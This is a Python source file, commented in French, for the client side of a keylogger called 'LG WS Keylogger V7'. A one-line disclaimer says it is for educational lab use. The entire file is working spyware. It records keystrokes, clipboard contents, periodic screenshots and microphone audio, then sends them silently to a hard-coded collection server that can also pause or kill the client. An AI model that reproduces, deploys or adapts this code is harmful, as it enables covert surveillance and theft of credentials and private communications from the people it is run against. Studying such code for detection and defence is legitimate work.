"""
LG WS KEYLOGGER - CLIENT (VICTIME) - V7 (AUDIO ENABLED)
-------------------------------------------------------
ATTENTION : Ce logiciel est conçu uniquement à des fins pédagogiques 
dans le cadre d'un laboratoire d'étude en cybersécurité.
"""

import threading
import time
import platform
import socket
import uuid
import base64
import requests
import pyperclip
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write
from pynput import keyboard
from PIL import ImageGrab
from datetime import datetime
from io import BytesIO

# --- CONFIGURATION ---
SERVER_URL = "http://172.16.20.202:5000/api/data"
SEND_INTERVAL = 3
SCREENSHOT_INTERVAL = 30 
AUDIO_INTERVAL = 60    # Enregistre le son toutes les 60 secondes
AUDIO_DURATION = 5     # Durée de l'enregistrement (secondes)

class LG_WS_Keylogger:
    def __init__(self):
        self.uuid = str(uuid.uuid4())
        self.log_buffer = ""
        self.is_running = True
        self.is_paused = False
        self.lock = threading.Lock()
        self.last_clipboard = ""
        self.system_info = self.get_system_info()
        
        # Gestion Clavier
        self.caps_lock_on = False 
        self.alt_gr_pressed = False 

    def get_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def get_system_info(self):
        return {
            "os": platform.system(),
            "hostname": socket.gethostname(),
            "ip_address": self.get_ip_address(),
            "uuid": self.uuid,
            "agent_version": "LG WS v1.3 (Audio Capable)"
        }

    # --- PARTIE AUDIO ---
    def record_and_send_audio(self):
        """Enregistre l'audio dans un thread pour ne pas bloquer le keylogger"""
        if self.is_paused: return
        
        try:
            fs = 44100  # Fréquence
            # Enregistrement (bloquant pour ce thread, mais pas pour le programme principal)
            recording = sd.rec(int(AUDIO_DURATION * fs), samplerate=fs, channels=1) # Mono pour être léger
            sd.wait()
            
            # Sauvegarde en mémoire (pas de fichier disque)
            virtual_file = BytesIO()
            write(virtual_file, fs, recording)
            
            # Encodage Base64
            encoded_audio = base64.b64encode(virtual_file.getvalue()).decode()
            
            # Envoi immédiat
            packet = {
                "uuid": self.uuid,
                "type": "audio",
                "audio_data": encoded_audio
            }
            requests.post(SERVER_URL, json=packet, timeout=10)
            
        except Exception:
            pass # Si pas de micro ou erreur, on continue silencieusement

    # --- PARTIE CLAVIER (AZERTY FIX) ---
    def process_key_azerty(self, key):
        try:
            if key == keyboard.Key.space: return " "
            if key == keyboard.Key.enter: return "\n"
            if key == keyboard.Key.backspace: return "[DEL]"
            if key == keyboard.Key.tab: return "\t"
            
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                if self.alt_gr_pressed:
                    if char == 'à' or char == '0': return "@"
                    if char == 'e': return "€"
                if self.caps_lock_on and char.isalpha():
                    return char.upper()
                return char
            return ""
        except: return ""

    def on_press(self, key):
        if self.is_paused: return
        if key == keyboard.Key.caps_lock:
            self.caps_lock_on = not self.caps_lock_on
            return
        if key == keyboard.Key.alt_gr:
            self.alt_gr_pressed = True
            return

        clean_char = self.process_key_azerty(key)
        if clean_char:
            with self.lock:
                self.log_buffer += clean_char

    def on_release(self, key):
        if key == keyboard.Key.alt_gr:
            self.alt_gr_pressed = False

    def monitor_clipboard(self):
        while self.is_running:
            if not self.is_paused:
                try:
                    current = pyperclip.paste()
                    if current and current != self.last_clipboard:
                        self.last_clipboard = current
                        ts = datetime.now().strftime("%H:%M:%S")
                        with self.lock:
                            self.log_buffer += f"\n--- [CLIPBOARD {ts}] ---\n{current}\n-----------------------------\n"
                except: pass
            time.sleep(1)

    def capture_screenshot(self):
        if self.is_paused: return None
        try:
            screenshot = ImageGrab.grab()
            buffered = BytesIO()
            screenshot.save(buffered, format="JPEG", quality=40)
            return base64.b64encode(buffered.getvalue()).decode()
        except: return None

    def send_heartbeat(self):
        data = {
            "uuid": self.uuid, "timestamp": str(datetime.now()),
            "type": "heartbeat", "system_info": self.system_info,
            "keystrokes": "", "screenshot": None
        }
        if not self.is_paused:
            with self.lock:
                if self.log_buffer:
                    data["keystrokes"] = self.log_buffer
                    data["type"] = "log_update"
                    self.log_buffer = ""
        try:
            res = requests.post(SERVER_URL, json=data, timeout=3)
            if res.status_code == 200:
                self.handle_command(res.json().get("command"))
        except: pass

    def handle_command(self, cmd):
        if cmd == "kill": self.is_running = False
        elif cmd == "stop" and not self.is_paused: self.is_paused = True
        elif cmd == "continue" and self.is_paused: self.is_paused = False

    def main_loop(self):
        print(f"[*] LG WS KEYLOGGER V7 (Audio) - UUID: {self.uuid}")
        
        last_screen = 0
        last_audio = 0
        
        while self.is_running:
            now = time.time()
            
            # Gestion Screenshot
            if not self.is_paused and (now - last_screen > SCREENSHOT_INTERVAL):
                scr = self.capture_screenshot()
                if scr:
                    try: requests.post(SERVER_URL, json={"uuid": self.uuid, "type": "screen", "screenshot": scr})
                    except: pass
                last_screen = now

            # Gestion Audio (Nouveau Thread)
            if not self.is_paused and (now - last_audio > AUDIO_INTERVAL):
                # On lance l'enregistrement dans un thread pour ne pas bloquer la boucle
                threading.Thread(target=self.record_and_send_audio).start()
                last_audio = now

            self.send_heartbeat()
            time.sleep(SEND_INTERVAL)

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()
        threading.Thread(target=self.monitor_clipboard, daemon=True).start()
        try: self.main_loop()
        except KeyboardInterrupt: listener.stop()

if __name__ == "__main__":
    LG_WS_Keylogger().start()
